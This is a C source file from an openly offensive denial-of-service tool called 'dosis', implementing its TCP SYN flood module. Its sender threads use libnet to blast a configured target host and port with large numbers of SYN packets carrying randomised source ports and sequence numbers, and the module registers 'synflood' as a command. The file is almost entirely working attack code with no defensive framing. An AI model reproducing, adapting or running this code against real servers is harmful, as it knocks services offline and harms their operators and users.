/*****************************************************************************
 * tcpsyn.c
 *
 * DoS on TCP servers by SYN flood.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "tea.h"
#include "tcpsyn.h"
#include "lnet.h"
#include "ipqex.h"
#include "pthreadex.h"
#include "log.h"

#define BUFSIZE    2048

typedef struct _tag_TCPSYN_WORK {
  THREAD_WORK  *w;
  LN_CONTEXT    lnc;
  ipqex_msg_t   msg;
} TCPSYN_WORK;

static ipqex_info_t        attack_tcpsyn__ipq;
static pthreadex_flag_t    attack_flag;


static void sender_thread(TCPSYN_WORK *tw)
{
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int npackets, i;

  DBG("[SS_%02u] Started sender thread", tw->w->id);

  /* set how many packets will be sent by this thread */
  npackets = cfg->packets / (cfg->c - cfg->l);
  if(tw->w->id == cfg->c - 1)
    npackets += cfg->packets - (npackets * (cfg->c - cfg->l));

  /* ATTACK */
  while(!cfg->finalize)
  {
    /* wait for work */
    pthreadex_flag_wait(&attack_flag);

    /* build TCP packet with payload (if requested) */
    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
    for(i = 0; i < npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(&tw->lnc,
                     &cfg->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &cfg->dhost.addr.in.inaddr, cfg->dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }
}

static void attack_tcpsyn__thread(THREAD_WORK *w)
{
  int r;
  TCPSYN_WORK tw;

  /* initialize specialized work thread data */
  memset(&tw, 0, sizeof(tw));
  tw.w = w;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_tcpsyn__thread_cleanup, &tw);

  /* initialize libnet */
  DBG("[MM_%02u] Initializing libnet.", tw.w->id);
  ln_init_context(&(tw.lnc));

  /* wait 4 start */
  pthreadex_barrier_wait(w->start);

  /* launch specialized thread */
  if(w->id < cfg->l)
    listener_thread(&tw);
  else
    sender_thread(&tw);

  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

static void attack_tcpsyn(void)
{
  /* initialize */
  DBG("Initializing IPQ...");
  if(ipqex_init(&attack_tcpsyn__ipq, BUFSIZE))
    FAT("  !! Cannot initialize IPQ.");

  /* flag that will keep attack threads waiting for work */
  pthreadex_flag_init(&attack_flag, 0);

  /* launch attack */
  tea_timer(attack_tcpsyn__go2work, attack_tcpsyn__thread);

  /* finalize ipq */
  ipqex_destroy(&attack_tcpsyn__ipq);
}

/*****************************************************************************
 * COMMAND DECLARATION
 *
 *   Following structure defines command name, syntax, operations and default
 *   tests mask.
 *
 *****************************************************************************/

static char *command_aliases[] = { "tcpsyn", "synflood", "syn", NULL };

DOS_COMMAND dos_attack_tcpsyn = {
  /* command names:                  */ command_aliases,
  /* command implementation:         */ attack_tcpsyn,
  /* minimum and maximum parameters: */ 0, 0
};

